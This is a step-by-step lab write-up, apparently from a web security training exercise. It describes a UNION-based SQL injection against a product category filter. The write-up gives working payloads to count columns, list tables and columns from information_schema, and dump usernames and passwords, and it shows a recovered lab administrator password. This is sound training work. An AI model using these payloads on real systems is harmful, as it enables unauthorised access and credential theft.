# No.5 Lab: SQL injection attack, listing the database contents on non-Oracle databases
<img width="1919" height="968" alt="image" src="https://github.com/user-attachments/assets/cf4f4ece-7763-4955-a223-bafc536fcf82" />

### Step 1: Use Burp Suite to intercept and modify the request that sets the product category filter.
### Step 2: Make payload to get database information

#### Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
`'+UNION+SELECT+'abc','def'--`
<img width="1493" height="958" alt="image" src="https://github.com/user-attachments/assets/cfc47f30-7510-4885-bb4f-c4df39c089b1" />

#### Use the following payload to retrieve the list of tables in the database:
`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
<img width="1489" height="972" alt="image" src="https://github.com/user-attachments/assets/aaaf4cef-bfdf-4ec7-85ec-2060babe7bb5" />

#### Find the name of the table containing user credentials.

#### Use the following payload to retrieve the details of the columns in the table:
`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_djvwwf'--`
<img width="1487" height="959" alt="image" src="https://github.com/user-attachments/assets/b61d313a-b50e-4429-a4e5-395e0f18bfef" />

#### Find the names of the columns containing usernames and passwords.

#### Use the following payload to retrieve the usernames and passwords for all users:
`'+UNION+SELECT+username_ltadir,+password_dbcgbx+FROM+users_djvwwf--`
<img width="1490" height="1001" alt="image" src="https://github.com/user-attachments/assets/de5f1c9f-a676-4a6f-ad8d-7aafb0e456ec" />

#### Find the password for the administrator user, and use it to log in.
Password: rgimusqflf2snya2i865
<img width="1919" height="961" alt="image" src="https://github.com/user-attachments/assets/7d0b72cb-3228-45c3-b4a2-aeafad112a1b" />
<img width="1919" height="959" alt="image" src="https://github.com/user-attachments/assets/6e5048ef-dd28-4914-b306-6201608a8c0c" />
